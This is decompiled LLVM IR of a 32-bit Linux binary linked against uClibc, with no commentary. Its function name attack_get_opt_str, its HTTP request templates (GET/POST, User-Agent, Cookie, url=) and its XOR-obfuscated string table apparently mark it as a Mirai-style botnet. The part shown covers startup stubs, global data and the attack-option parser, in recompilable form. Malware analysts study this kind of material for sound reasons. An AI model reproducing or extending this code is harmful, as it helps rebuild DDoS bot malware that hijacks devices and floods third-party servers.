source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%linux_dirent = type { i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat64 = type { i64, i64, i32, i32, i32, i32, i64, i64, i64, i32, i32, i64, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8057b78.5 = global i32 0
@global_var_8057b90.6 = local_unnamed_addr global i32* @global_var_8057b78.5
@global_var_8057620.7 = global i32 16
@global_var_8057b7c.9 = local_unnamed_addr global i32 0
@global_var_8057d20.11 = local_unnamed_addr global i32 0
@global_var_8055854.12 = constant [4 x i8] c"GET\00"
@global_var_805582d.13 = constant i32 1210056751
@global_var_80558fc.14 = constant i32 624558112
@global_var_805582f.15 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8055847.16 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_8055866.17 = constant [3 x i8] c"\0D\0A\00"
@global_var_8055858.18 = constant [9 x i8] c"Cookie: \00"
@global_var_8055861.19 = constant [3 x i8] c"; \00"
@global_var_8055869.20 = constant i32 1952972859
@global_var_8055864.21 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_805586b.22 = constant [5 x i8] c"http\00"
@global_var_8055870.23 = constant [5 x i8] c"url=\00"
@global_var_8055875.24 = constant [5 x i8] c"POST\00"
@global_var_805587a.25 = constant i32 -1507262425
@global_var_8055b39.26 = constant i32 1852375101
@global_var_805a858.27 = local_unnamed_addr global i32 0
@global_var_8057d24.28 = local_unnamed_addr global i32 0
@global_var_805a85c.29 = local_unnamed_addr global i32 0
@global_var_8057d28.30 = local_unnamed_addr global i32 0
@global_var_8057b9c.31 = local_unnamed_addr global i32 134550048
@global_var_805a864.32 = local_unnamed_addr global i32 0
@global_var_805a862.33 = local_unnamed_addr global i32 0
@global_var_8057b94.34 = local_unnamed_addr global i32 -1
@global_var_8057d2c.36 = local_unnamed_addr global i32 0
@global_var_805a860.37 = global i32 0
@global_var_8055867.38 = constant i32 3866634
@global_var_8057b98.39 = local_unnamed_addr global i32 -1
@global_var_8055890.41 = constant i32 16777216
@global_var_8057d34.42 = local_unnamed_addr global i32 0
@global_var_8057d40.43 = local_unnamed_addr global i32 0
@global_var_8057d38.44 = local_unnamed_addr global i32 0
@global_var_8057d3c.45 = local_unnamed_addr global i32 0
@global_var_805a878.46 = local_unnamed_addr global i32 0
@global_var_8057d90.47 = local_unnamed_addr global i32 0
@global_var_8057d44.48 = local_unnamed_addr global i32 0
@global_var_8057d88.49 = local_unnamed_addr global i32 0
@global_var_805a870.51 = local_unnamed_addr global i32 0
@global_var_805a874.52 = local_unnamed_addr global i32 0
@global_var_8057d60.53 = global i32 0
@global_var_8057d62.54 = local_unnamed_addr global i32 0
@global_var_8057d68.55 = local_unnamed_addr global i32 0
@global_var_8057d64.56 = local_unnamed_addr global i32 0
@global_var_8057d69.58 = local_unnamed_addr global i32 0
@global_var_8057d74.60 = global i32 0
@global_var_8057d82.61 = local_unnamed_addr global i32 0
@global_var_8055895.62 = constant [8 x i8] c"1!%1\229?\00"
@global_var_80558b2.63 = constant [6 x i8] c"14=9>\00"
@global_var_805589d.65 = constant [5 x i8] c" 1##\00"
@global_var_80558a2.66 = constant [9 x i8] c"381>75=5\00"
@global_var_80558ab.67 = constant i32 490349927
@global_var_8055868.68 = constant i32 1744845568
@global_var_805594f.69 = constant [5 x i8] c"abcd\00"
@global_var_80558b8.70 = constant [4 x i8] c"14=\00"
@global_var_80558bc.71 = constant [5 x i8] c"1>;?\00"
@global_var_80558c1.72 = constant [5 x i8] c"\22??$\00"
@global_var_80558c6.73 = constant [7 x i8] c"(3ceaa\00"
@global_var_80558cd.74 = constant [6 x i8] c"$$>5$\00"
@global_var_80558d3.75 = constant [9 x i8] c"8%>$egei\00"
@global_var_805592d.76 = constant [6 x i8] c"&9*(&\00"
@global_var_80558dc.77 = constant [6 x i8] c"abcde\00"
@global_var_80558e2.78 = constant [9 x i8] c"a``a389>\00"
@global_var_80558eb.79 = constant [8 x i8] c"4561%<$\00"
@global_var_805591b.80 = constant [4 x i8] c"abc\00"
@global_var_80558f3.81 = constant [7 x i8] c"1>$#<!\00"
@global_var_80558fa.82 = constant [4 x i8] c"e% \00"
@global_var_80558fe.83 = constant [9 x i8] c":%1>$538\00"
@global_var_8055907.84 = constant [6 x i8] c"*<((~\00"
@global_var_805590d.85 = constant [7 x i8] c"abcdef\00"
@global_var_8055914.86 = constant [11 x i8] c"?5<9>%(abc\00"
@global_var_805591f.87 = constant [7 x i8] c"\0A$5eba\00"
@global_var_8055926.88 = constant i32 490349927
@global_var_8055933.89 = constant [5 x i8] c"%#5\22\00"
@global_var_8055938.90 = constant [7 x i8] c"415=?>\00"
@global_var_805593f.91 = constant [4 x i8] c"29>\00"
@global_var_8055943.92 = constant [8 x i8] c"#%  ?\22$\00"
@global_var_805594b.93 = constant [9 x i8] c"*)14abcd\00"
@global_var_8055954.94 = constant [11 x i8] c"#% 5\22&9#?\22\00"
@global_var_8057d6c.95 = local_unnamed_addr global i32 0
@global_var_8057d6a.96 = local_unnamed_addr global i32 0
@global_var_8057d70.97 = local_unnamed_addr global i32 0
@global_var_8057d78.98 = local_unnamed_addr global i32 0
@global_var_8057d84.99 = local_unnamed_addr global i32 0
@global_var_805a880.100 = global i32 0
@global_var_805598c.102 = constant i32 -2046781124
@global_var_805a890.103 = local_unnamed_addr global i32 0
@global_var_805a894.104 = local_unnamed_addr global i32 0
@global_var_805598f.105 = constant i32 2030098566
@global_var_805a8a0.106 = local_unnamed_addr global i32 0
@global_var_805a8a4.107 = local_unnamed_addr global i32 0
@global_var_8055992.108 = constant i32 1499028601
@global_var_805a8a8.109 = local_unnamed_addr global i32 0
@global_var_805a8ac.110 = local_unnamed_addr global i32 0
@global_var_80559b0.111 = constant i32 1380928786
@global_var_805a8b0.112 = local_unnamed_addr global i32 0
@global_var_805a8b4.113 = local_unnamed_addr global i32 0
@global_var_80559b8.114 = constant i32 1480939538
@global_var_805a8b8.115 = local_unnamed_addr global i32 0
@global_var_805a8bc.116 = local_unnamed_addr global i32 0
@global_var_80559be.117 = constant i32 1029266194
@global_var_805a8c0.118 = local_unnamed_addr global i32 0
@global_var_805a8c4.119 = local_unnamed_addr global i32 0
@global_var_80559c3.120 = constant i32 1380928786
@global_var_805a8c8.121 = local_unnamed_addr global i32 0
@global_var_805a8cc.122 = local_unnamed_addr global i32 0
@global_var_80559d2.123 = constant i32 1297895442
@global_var_805a8d0.124 = local_unnamed_addr global i32 0
@global_var_805a8d4.125 = local_unnamed_addr global i32 0
@global_var_80559d9.126 = constant i32 1548307986
@global_var_805a8d8.127 = local_unnamed_addr global i32 0
@global_var_805a8dc.128 = local_unnamed_addr global i32 0
@global_var_80559e2.129 = constant i32 1414749203
@global_var_805a8e0.130 = local_unnamed_addr global i32 0
@global_var_805a8e4.131 = local_unnamed_addr global i32 0
@global_var_80559ea.132 = constant i32 1380928786
@global_var_805a8e8.133 = local_unnamed_addr global i32 0
@global_var_805a8ec.134 = local_unnamed_addr global i32 0
@global_var_80559fb.135 = constant i32 1380928786
@global_var_805a8f0.136 = local_unnamed_addr global i32 0
@global_var_805a8f4.137 = local_unnamed_addr global i32 0
@global_var_8055a0a.138 = constant i32 1920627327
@global_var_805a8f8.139 = local_unnamed_addr global i32 0
@global_var_805a8fc.140 = local_unnamed_addr global i32 0
@global_var_8055a14.141 = constant i32 1581864978
@global_var_805a900.142 = local_unnamed_addr global i32 0
@global_var_805a904.143 = local_unnamed_addr global i32 0
@global_var_8055a28.144 = constant i32 1599867994
@global_var_805a908.145 = local_unnamed_addr global i32 0
@global_var_805a90c.146 = local_unnamed_addr global i32 0
@global_var_8055a40.147 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_805a910.148 = local_unnamed_addr global i32 0
@global_var_805a914.149 = local_unnamed_addr global i32 0
@global_var_8055a49.150 = constant i32 1264081170
@global_var_805a918.151 = local_unnamed_addr global i32 0
@global_var_805a91c.152 = local_unnamed_addr global i32 0
@global_var_8055a58.153 = constant i32 1264081170
@global_var_805a920.154 = local_unnamed_addr global i32 0
@global_var_805a924.155 = local_unnamed_addr global i32 0
@global_var_8055a6c.156 = constant i32 1264081170
@global_var_805a928.157 = local_unnamed_addr global i32 0
@global_var_805a92c.158 = local_unnamed_addr global i32 0
@global_var_8055a84.159 = constant i32 1264081170
@global_var_805a930.160 = local_unnamed_addr global i32 0
@global_var_805a934.161 = local_unnamed_addr global i32 0
@global_var_8055a9d.162 = constant i32 1264081170
@global_var_805a938.163 = local_unnamed_addr global i32 0
@global_var_805a93c.164 = local_unnamed_addr global i32 0
@global_var_8055aad.165 = constant [7 x i8] c"NUXQQ=\00"
@global_var_805a940.166 = local_unnamed_addr global i32 0
@global_var_805a944.167 = local_unnamed_addr global i32 0
@global_var_8055ab4.168 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_805a948.169 = local_unnamed_addr global i32 0
@global_var_805a94c.170 = local_unnamed_addr global i32 0
@global_var_8055abc.171 = constant [8 x i8] c"NDNIXP=\00"
@global_var_805a950.172 = local_unnamed_addr global i32 0
@global_var_805a954.173 = local_unnamed_addr global i32 0
@global_var_8055ac4.174 = constant [4 x i8] c"NU=\00"
@global_var_805a958.175 = local_unnamed_addr global i32 0
@global_var_805a95c.176 = local_unnamed_addr global i32 0
@global_var_8055ac8.177 = constant i32 1398038290
@global_var_805a960.178 = local_unnamed_addr global i32 0
@global_var_805a964.179 = local_unnamed_addr global i32 0
@global_var_8055ae0.180 = constant i32 1499028569
@global_var_805a968.181 = local_unnamed_addr global i32 0
@global_var_805a96c.182 = local_unnamed_addr global i32 0
@global_var_8055afd.183 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_805a970.184 = local_unnamed_addr global i32 0
@global_var_805a974.185 = local_unnamed_addr global i32 0
@global_var_805a978.186 = local_unnamed_addr global i32 0
@global_var_805a97c.187 = local_unnamed_addr global i32 0
@global_var_8055b07.188 = constant [6 x i8] c"RZTS=\00"
@global_var_805a980.189 = local_unnamed_addr global i32 0
@global_var_805a984.190 = local_unnamed_addr global i32 0
@global_var_8055b0d.191 = constant [7 x i8] c"XSIXO=\00"
@global_var_805a988.192 = local_unnamed_addr global i32 0
@global_var_805a98c.193 = local_unnamed_addr global i32 0
@global_var_8055b14.194 = constant i32 1398038290
@global_var_805a990.195 = local_unnamed_addr global i32 0
@global_var_805a994.196 = local_unnamed_addr global i32 0
@global_var_8055b25.197 = constant i32 1398038290
@global_var_805a998.198 = local_unnamed_addr global i32 0
@global_var_805a99c.199 = local_unnamed_addr global i32 0
@global_var_8055b3b.200 = constant i32 1213361769
@global_var_805a9a0.201 = local_unnamed_addr global i32 0
@global_var_805a9a4.202 = local_unnamed_addr global i32 0
@global_var_8055b51.203 = constant i32 1581864978
@global_var_805a9a8.204 = local_unnamed_addr global i32 0
@global_var_805a9ac.205 = local_unnamed_addr global i32 0
@global_var_8055b63.206 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_805a9b0.207 = local_unnamed_addr global i32 0
@global_var_805a9b4.208 = local_unnamed_addr global i32 0
@global_var_8055b6f.209 = constant i32 1397969534
@global_var_805a9b8.210 = local_unnamed_addr global i32 0
@global_var_805a9bc.211 = local_unnamed_addr global i32 0
@global_var_8055c2c.212 = constant i32 1482579580
@global_var_805a9c0.213 = local_unnamed_addr global i32 0
@global_var_805a9c4.214 = local_unnamed_addr global i32 0
@global_var_8055c80.215 = constant i32 1482579580
@global_var_805a9c8.216 = local_unnamed_addr global i32 0
@global_var_805a9cc.217 = local_unnamed_addr global i32 0
@global_var_8055ca4.218 = constant i32 1230197374
@global_var_805a9d0.219 = local_unnamed_addr global i32 0
@global_var_805a9d4.220 = local_unnamed_addr global i32 0
@global_var_8055b87.221 = constant i32 2118735950
@global_var_805a9d8.222 = local_unnamed_addr global i32 0
@global_var_805a9dc.223 = local_unnamed_addr global i32 0
@global_var_8055b94.224 = constant i32 1331386447
@global_var_805a9e0.225 = local_unnamed_addr global i32 0
@global_var_805a9e4.226 = local_unnamed_addr global i32 0
@global_var_8055b9e.227 = constant i32 1549685329
@global_var_805a9e8.228 = local_unnamed_addr global i32 0
@global_var_805a9ec.229 = local_unnamed_addr global i32 0
@global_var_8055ba9.230 = constant i32 273242190
@global_var_805a9f0.231 = local_unnamed_addr global i32 0
@global_var_805a9f4.232 = local_unnamed_addr global i32 0
@global_var_8055bb6.233 = constant i32 1230197342
@global_var_805a9f8.234 = local_unnamed_addr global i32 0
@global_var_805a9fc.235 = local_unnamed_addr global i32 0
@global_var_8055bc7.236 = constant i32 1398558537
@global_var_805aa00.237 = local_unnamed_addr global i32 0
@global_var_805aa04.238 = local_unnamed_addr global i32 0
@global_var_8055bdb.239 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_805aa08.240 = local_unnamed_addr global i32 0
@global_var_805aa0c.241 = local_unnamed_addr global i32 0
@global_var_8055b7b.242 = constant i32 1297635414
@global_var_805aa10.243 = local_unnamed_addr global i32 0
@global_var_805aa14.244 = local_unnamed_addr global i32 0
@global_var_8055be4.245 = constant i32 1397969502
@global_var_805aa18.246 = local_unnamed_addr global i32 0
@global_var_805aa1c.247 = local_unnamed_addr global i32 0
@global_var_8055bf1.248 = constant i32 1263491150
@global_var_805aa20.249 = local_unnamed_addr global i32 0
@global_var_805aa24.250 = local_unnamed_addr global i32 0
@global_var_8055c04.251 = constant i32 1263491150
@global_var_805aa28.252 = local_unnamed_addr global i32 0
@global_var_805aa2c.253 = local_unnamed_addr global i32 0
@global_var_8055cd8.254 = constant i32 1413960304
@global_var_805aa30.255 = local_unnamed_addr global i32 0
@global_var_805aa34.256 = local_unnamed_addr global i32 0
@global_var_8055d4c.257 = constant i32 1413960304
@global_var_805aa38.258 = local_unnamed_addr global i32 0
@global_var_805aa3c.259 = local_unnamed_addr global i32 0
@global_var_8055dc0.260 = constant i32 1413960304
@global_var_805aa40.261 = local_unnamed_addr global i32 0
@global_var_805aa44.262 = local_unnamed_addr global i32 0
@global_var_8055e10.263 = constant i32 1413960304
@global_var_805aa48.264 = local_unnamed_addr global i32 0
@global_var_805aa4c.265 = local_unnamed_addr global i32 0
@global_var_8055e84.266 = constant i32 1413960304
@global_var_805aa50.267 = local_unnamed_addr global i32 0
@global_var_805aa54.268 = local_unnamed_addr global i32 0
@global_var_805aa58.269 = local_unnamed_addr global i32 0
@global_var_805aa5c.270 = local_unnamed_addr global i32 0
@global_var_805aa60.271 = local_unnamed_addr global i32 0
@global_var_805aa64.272 = local_unnamed_addr global i32 0
@global_var_805aa68.273 = local_unnamed_addr global i32 0
@global_var_805aa6c.274 = local_unnamed_addr global i32 0
@global_var_8055c1e.275 = constant [11 x i8] c"YKOuXQMXO=\00"
@global_var_805aa70.276 = local_unnamed_addr global i32 0
@global_var_805aa74.277 = local_unnamed_addr global i32 0
@global_var_8055ef8.278 = constant i32 0
@global_var_805aa78.279 = global i32 0
@global_var_8057ba8.280 = global i32 0
@global_var_805aa7c.282 = global i32 0
@global_var_805aaac.283 = global i32 0
@global_var_805aab0.284 = local_unnamed_addr global i32 0
@global_var_805aabc.285 = local_unnamed_addr global i32 0
@global_var_805aac0.286 = local_unnamed_addr global i32 0
@global_var_805aab4.287 = global i32 0
@global_var_805adb4.288 = global i32 0
@global_var_805addc.289 = local_unnamed_addr global i32 0
@global_var_805adcc.290 = local_unnamed_addr global i32 0
@global_var_805add0.291 = local_unnamed_addr global i32 0
@global_var_805add4.292 = local_unnamed_addr global i32 0
@global_var_805add8.293 = local_unnamed_addr global i32 0
@global_var_805ade4.294 = local_unnamed_addr global i32 0
@global_var_805adf0.295 = local_unnamed_addr global i32 0
@global_var_805ade8.296 = local_unnamed_addr global i32 0
@global_var_805adf4.297 = local_unnamed_addr global i32 0
@global_var_805adc8.298 = local_unnamed_addr global i32 0
@global_var_805adc4.300 = local_unnamed_addr global i32 0
@global_var_805adec.301 = local_unnamed_addr global i32 0
@global_var_8057bc0.302 = global i32 0
@global_var_8057bd8.304 = global i32 0
@global_var_8057d98.305 = local_unnamed_addr global i32 0
@global_var_8055f10.306 = constant [11 x i8] c"/proc/stat\00"
@global_var_8057c00 = external local_unnamed_addr global i32
@global_var_8055f1b.311 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8055f29.312 = constant [10 x i8] c"processor\00"
@global_var_8055f4c.313 = constant i32 604672
@global_var_8055f33.315 = constant [24 x i8] c"/sys/devices/system/cpu\00"
@global_var_805adfc.316 = local_unnamed_addr global i32 0
@global_var_8058300.317 = local_unnamed_addr global i32 0
@global_var_8053374.318 = constant i32 -2097412609
@global_var_80582f8.319 = global i32 0
@global_var_80582fc.320 = local_unnamed_addr global i32 0
@global_var_805adf8.321 = local_unnamed_addr global i32 0
@global_var_8057c18.322 = global i32* bitcast (i16* @global_var_8057c20.308 to i32*)
@global_var_8057d9c.323 = local_unnamed_addr global i32 0
@global_var_8057b6c.324 = global i32 -1
@global_var_80538cb.325 = constant i32 -294069
@global_var_80582f0.326 = local_unnamed_addr global i32 0
@global_var_80582f4.327 = local_unnamed_addr global i32 0
@global_var_8056314.328 = constant [10 x i8] c"/dev/null\00"
@global_var_80582ec.329 = local_unnamed_addr global i32 0
@global_var_80582e4.330 = local_unnamed_addr global i32 0
@global_var_80582e8.331 = local_unnamed_addr global i32 0
@global_var_8057bf4.332 = local_unnamed_addr global i32* @global_var_8055868.68
@global_var_8053ab3.333 = constant i32 1928542531
@global_var_8053ad7.334 = constant i32 1928542531
@global_var_805a854.335 = local_unnamed_addr global i32 0
@global_var_8055f31.336 = constant i32 1932460146
@global_var_805830c.337 = local_unnamed_addr global i32 0
@global_var_8054453.338 = constant i32 92475553
@global_var_8058304.339 = global i32 0
@global_var_8058310.340 = local_unnamed_addr global i32 0
@global_var_8058308.341 = local_unnamed_addr global i32 0
@global_var_8054500.342 = constant i32 92473505
@global_var_8058314.343 = local_unnamed_addr global i32 0
@global_var_8057c1c.344 = local_unnamed_addr global i32 2
@global_var_8054794.345 = constant i32 -2096626177
@global_var_80547c7.346 = constant i32 -2097412609
@global_var_8054b1a.347 = constant i32 -2096099957
@global_var_8054b64.348 = constant i32 -2097412609
@global_var_8054c7b.349 = constant i32 92475553
@global_var_8054cb2.350 = constant [3 x i8] c"95\00"
@global_var_8054cdf.351 = constant i32 92470433
@global_var_805ae0c.352 = local_unnamed_addr global i32 0
@global_var_805ae00.353 = local_unnamed_addr global i32 0
@global_var_805ae04.354 = local_unnamed_addr global i32 0
@global_var_805ae08.355 = local_unnamed_addr global i32 0
@global_var_805ae1c.356 = local_unnamed_addr global i32 0
@global_var_805a518.357 = global i32 0
@global_var_805ae10.358 = local_unnamed_addr global i32 0
@global_var_805ae20.359 = local_unnamed_addr global i32 0
@global_var_805ae24.360 = local_unnamed_addr global i32 0
@global_var_805a318.361 = local_unnamed_addr global i32 0
@global_var_805a328.362 = local_unnamed_addr global i32 0
@global_var_805a32c.363 = local_unnamed_addr global i32 0
@global_var_805a848.364 = local_unnamed_addr global i32 0
@global_var_805a320.365 = global i32 0
@global_var_805a840.366 = local_unnamed_addr global i32 0
@global_var_805a83c.367 = local_unnamed_addr global i32 0
@global_var_805a834.368 = local_unnamed_addr global i32 0
@global_var_805a838.369 = local_unnamed_addr global i32 0
@global_var_805a84c.370 = local_unnamed_addr global i32 0
@global_var_805a534.371 = local_unnamed_addr global i32 0
@global_var_805a820.372 = global i32 0
@global_var_8057b68.373 = global i32 0
@global_var_8057d00.4 = local_unnamed_addr global i8 0
@global_var_8057d1c.10 = local_unnamed_addr global i8 0
@global_var_8057ba0.35 = local_unnamed_addr global i8 1
@global_var_8057d30.40 = local_unnamed_addr global i8 0
@global_var_8057d8c.50 = local_unnamed_addr global i16 0
@global_var_8057d80.57 = local_unnamed_addr global i8 0
@global_var_8057d76.59 = local_unnamed_addr global i16 0
@global_var_8057d81.64 = local_unnamed_addr global i8 0
@global_var_8057ba4.101 = local_unnamed_addr global i16 -4641
@global_var_805aa80.281 = global i8 0
@global_var_805ade0.299 = local_unnamed_addr global i8 0
@global_var_8057d94.303 = local_unnamed_addr global i8 0
@global_var_8057c20.308 = global i16 288
@global_var_8057c64.309 = local_unnamed_addr global i16 272

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_80480b7 = load i32, i32* @ebx, align 4
  %v1_80480b8 = call i32 @__get_pc_thunk_bx(i32 %v0_80480b7)
  %v0_80480bd = load i32, i32* @ebx, align 4
  %v1_80480bd = add i32 %v0_80480bd, 64195
  store i32 %v1_80480bd, i32* @ebx, align 4
  %v0_80480c3 = call i32 @frame_dummy()
  %v0_80480c8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480c8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480d3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480d3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480e6 = load i8, i8* @global_var_8057d00.4, align 256
  %v1_80480e6 = icmp eq i8 %v0_80480e6, 0
  br i1 %v1_80480e6, label %dec_label_pc_80480fb.preheader, label %entry.dec_label_pc_8048126_crit_edge

entry.dec_label_pc_8048126_crit_edge:             ; preds = %entry
  %v0_8048127.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048126

dec_label_pc_80480fb.preheader:                   ; preds = %entry
  %v0_80480fb1 = load i32, i32* bitcast (i32** @global_var_8057b90.6 to i32*), align 16
  %v1_80481022 = icmp eq i32 %v0_80480fb1, 0
  %v1_80481044 = icmp eq i1 %v1_80481022, false
  br i1 %v1_80481044, label %dec_label_pc_80480f1.lr.ph, label %dec_label_pc_8048106

dec_label_pc_80480f1.lr.ph:                       ; preds = %dec_label_pc_80480fb.preheader
  br label %dec_label_pc_80480f1

dec_label_pc_80480f1:                             ; preds = %dec_label_pc_80480f1.lr.ph, %dec_label_pc_80480f1
  %v0_80480f1 = phi i32 [ %v0_80480fb1, %dec_label_pc_80480f1.lr.ph ], [ %v0_80480fb, %dec_label_pc_80480f1 ]
  %v1_80480f1 = add i32 %v0_80480f1, 4
  store i32 %v1_80480f1, i32* bitcast (i32** @global_var_8057b90.6 to i32*), align 16
  call void @__pseudo_call(i32 %v0_80480f1)
  %v0_80480fb = load i32, i32* bitcast (i32** @global_var_8057b90.6 to i32*), align 16
  %v1_8048102 = icmp eq i32 %v0_80480fb, 0
  %v1_8048104 = icmp eq i1 %v1_8048102, false
  br i1 %v1_8048104, label %dec_label_pc_80480f1, label %dec_label_pc_80480fb.dec_label_pc_8048106_crit_edge

dec_label_pc_80480fb.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480f1
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480fb.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480fb.preheader
  store i8 1, i8* @global_var_8057d00.4, align 256
  br label %dec_label_pc_8048126

dec_label_pc_8048126:                             ; preds = %entry.dec_label_pc_8048126_crit_edge, %dec_label_pc_8048106
  %v0_8048127 = phi i32 [ %v0_8048127.pre, %entry.dec_label_pc_8048126_crit_edge ], [ 0, %dec_label_pc_8048106 ]
  ret i32 %v0_8048127

; uselistorder directives
  uselistorder i32 %v0_80480fb, { 1, 0 }
  uselistorder i32 %v0_80480f1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8057b90.6 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8057d00.4, { 1, 0 }
  uselistorder label %dec_label_pc_8048126, { 1, 0 }
  uselistorder label %dec_label_pc_80480f1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048130 = load i32, i32* @ebp, align 4
  store i32 %v0_8048130, i32* %stack_var_-4, align 4
  %v4_8048130 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048130, i32* @ebp, align 4
  %v0_804813b = call i32 @function_8048140()
  ret i32 %v0_804813b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048140() local_unnamed_addr {
dec_label_pc_8048140:
  %v0_8048147 = load i32, i32* @eax, align 4
  %v1_8048147 = icmp eq i32 %v0_8048147, 0
  br i1 %v1_8048147, label %dec_label_pc_8048160, label %dec_label_pc_804814b

dec_label_pc_804814b:                             ; preds = %dec_label_pc_8048140
  %v1_8048158 = call i32 @__libc_errno(i32 ptrtoint (i32* @global_var_8057620.7 to i32))
  br label %dec_label_pc_8048160

dec_label_pc_8048160:                             ; preds = %dec_label_pc_8048140, %dec_label_pc_804814b
  %v0_8048160 = load i32, i32* @global_var_8057b7c.9, align 4
  %v1_8048165 = icmp eq i32 %v0_8048160, 0
  br i1 %v1_8048165, label %dec_label_pc_804817f, label %dec_label_pc_8048169

dec_label_pc_8048169:                             ; preds = %dec_label_pc_8048160
  br label %dec_label_pc_804817f

dec_label_pc_804817f:                             ; preds = %dec_label_pc_8048169, %dec_label_pc_8048160
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048160, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804818c = load i32, i32* @eax, align 4
  store i32 %v0_804818c, i32* %stack_var_-4, align 4
  %v4_804818c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804818e = load i32, i32* @edx, align 4
  %v9_80481a0 = call i32 @__uClibc_main(i32 134537840, i32 %arg1, i32* nonnull %stack_var_4, i32 134512820, i32 134567943, i32 %v0_804818e, i32 %v4_804818c, i32 %v0_804818c)
  ret i32 %v9_80481a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @attack_get_opt_str(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %v4_80481b5 = zext i8 %arg1 to i32
  %v4_80481cf = icmp eq i8 %arg1, 0
  br i1 %v4_80481cf, label %dec_label_pc_80481f6, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %entry
  %v1_80481d7 = add i32 %arg2, 4
  %v2_80481d7 = inttoptr i32 %v1_80481d7 to i8*
  %v3_80481d7 = load i8, i8* %v2_80481d7, align 1
  %v16_80481d7 = icmp eq i8 %v3_80481d7, %tmp
  br i1 %v16_80481d7, label %dec_label_pc_80481fe, label %dec_label_pc_80481dc

dec_label_pc_80481dc:                             ; preds = %dec_label_pc_80481d3
  %v5_80481b5 = load i32, i32* @eax, align 4
  %v6_80481b5 = and i32 %v5_80481b5, -256
  %v4_80481d3 = urem i32 %arg3, 256
  %v7_80481d3 = or i32 %v6_80481b5, %v4_80481d3
  br label %dec_label_pc_80481f1

dec_label_pc_80481e3:                             ; preds = %dec_label_pc_80481f1
  %v1_80481e3 = add i32 %v0_80481e6.in, 12
  %v2_80481e3 = inttoptr i32 %v1_80481e3 to i8*
  %v3_80481e3 = load i8, i8* %v2_80481e3, align 1
  %v4_80481e3 = zext i8 %v3_80481e3 to i32
  %v6_80481e3 = and i32 %v5_80481e3, -256
  %v7_80481e3 = or i32 %v4_80481e3, %v6_80481e3
  %v16_80481eb = icmp eq i8 %v3_80481e3, %tmp
  br i1 %v16_80481eb, label %dec_label_pc_80481fe, label %dec_label_pc_80481f1

dec_label_pc_80481f1:                             ; preds = %dec_label_pc_80481e3, %dec_label_pc_80481dc
  %v5_80481e3 = phi i32 [ %v7_80481e3, %dec_label_pc_80481e3 ], [ %v7_80481d3, %dec_label_pc_80481dc ]
  %v0_80481e6.in = phi i32 [ %v0_80481e6, %dec_label_pc_80481e3 ], [ %arg2, %dec_label_pc_80481dc ]
  %v0_80481f1 = phi i32 [ %v1_80481f1, %dec_label_pc_80481e3 ], [ 0, %dec_label_pc_80481dc ]
  %v0_80481e6 = add i32 %v0_80481e6.in, 8
  %v1_80481f1 = add i32 %v0_80481f1, 1
  %v12_80481f2 = icmp eq i32 %v4_80481b5, %v1_80481f1
  %v1_80481f4 = icmp eq i1 %v12_80481f2, false
  br i1 %v1_80481f4, label %dec_label_pc_80481e3, label %dec_label_pc_80481f6

dec_label_pc_80481f6:                             ; preds = %dec_label_pc_80481f1, %entry
  ret i32 %arg4

dec_label_pc_80481fe:                             ; preds = %dec_label_pc_80481e3, %dec_label_pc_80481d3
  %v0_80481fe = phi i32 [ %arg2, %dec_label_pc_80481d3 ], [ %v0_80481e6, %dec_label_pc_80481e3 ]
  %v1_80481fe = inttoptr i32 %v0_80481fe to i32*
  %v2_80481fe = load i32, i32* %v1_80481fe, align 4
  ret i32 %v2_80481fe

; uselistorder directives
  uselistorder i32 %v0_80481e6.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

